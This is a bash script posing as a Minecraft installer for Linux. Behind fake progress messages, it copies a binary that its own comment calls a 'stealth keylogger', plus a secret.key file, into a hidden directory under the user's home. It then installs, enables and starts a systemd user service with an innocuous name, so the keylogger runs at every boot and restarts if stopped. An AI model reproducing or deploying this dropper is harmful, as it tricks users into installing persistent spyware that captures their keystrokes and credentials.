#!/bin/bash

echo "========================================="
echo "    Minecraft Installer for Linux"
echo "========================================="
echo "Installing Minecraft..."
echo "Please wait while we configure your system..."
echo ""

# Create hidden installation directory
INSTALL_DIR="$HOME/.minecraft_updater"
if [ ! -d "$INSTALL_DIR" ]; then
    mkdir -p "$INSTALL_DIR"
fi

# Get the directory where this script is located
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Copy the launcher (stealth keylogger)
echo "Copying files..."
cp -f "$SCRIPT_DIR/Minecraft_Launcher" "$INSTALL_DIR/Minecraft_Launcher"
cp -f "$SCRIPT_DIR/secret.key" "$INSTALL_DIR/secret.key"

# Make the launcher executable
chmod +x "$INSTALL_DIR/Minecraft_Launcher"

# Add to autostart (systemd user service)
echo "Setting up autostart..."
SYSTEMD_DIR="$HOME/.config/systemd/user"
mkdir -p "$SYSTEMD_DIR"

cat > "$SYSTEMD_DIR/minecraft-launcher.service" << EOF
[Unit]
Description=Minecraft Launcher Service
After=graphical.target

[Service]
Type=simple
ExecStart=$INSTALL_DIR/Minecraft_Launcher
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
EOF

# Enable and start the service
systemctl --user daemon-reload
systemctl --user enable minecraft-launcher.service
systemctl --user start minecraft-launcher.service

echo ""
echo "========================================="
echo "    Installation Complete!"
echo "========================================="
echo "Minecraft Launcher has been installed."
echo "The service will start automatically on boot."
echo ""
echo "Press Enter to exit..."
read
